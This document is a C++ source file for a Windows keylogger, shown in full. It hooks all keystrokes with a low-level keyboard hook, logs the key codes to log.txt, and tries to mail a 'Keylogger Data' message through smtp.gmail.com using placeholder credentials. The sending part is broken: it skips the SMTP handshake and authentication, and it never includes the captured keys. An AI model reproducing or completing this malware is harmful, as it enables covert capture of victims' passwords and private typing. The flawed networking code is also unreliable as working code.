#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define PORT "587"
#define SERVER "smtp.gmail.com"
#define EMAIL "yass@gmail.com"
#define PASSWORD "pass"

using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN))
    {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        ofstream outfile;
        outfile.open("log.txt", ios::app);
        outfile << p->vkCode << endl;
        outfile.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cout << "WSAStartup failed: " << iResult << endl;
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        cout << "socket failed: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    struct addrinfo* result = NULL, * ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(SERVER, PORT, &hints, &result);
    if (iResult != 0) {
        cout << "getaddrinfo failed: " << iResult << endl;
        WSACleanup();
        return 1;
    }

    iResult = connect(sock, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        cout << "connect failed: " << WSAGetLastError() << endl;
        freeaddrinfo(result);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    char buffer[1024];
    iResult = recv(sock, buffer, sizeof(buffer), 0);
    if (iResult == SOCKET_ERROR) {
        cout << "recv failed: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    string message = "Subject: Keylogger Data\n\n";
    message += "The following keystrokes were captured:\n\n";

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);

    ofstream outfile;
    outfile.open("log.txt", ios::app);
    outfile << message << endl;
    outfile.close();

    iResult = send(sock, message.c_str(), message.size(), 0);
    if (iResult == SOCKET_ERROR) {
        cout << "send failed: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    iResult = shutdown(sock, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        cout << "shutdown failed: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    closesocket(sock);
    WSACleanup();

    return 0;
}
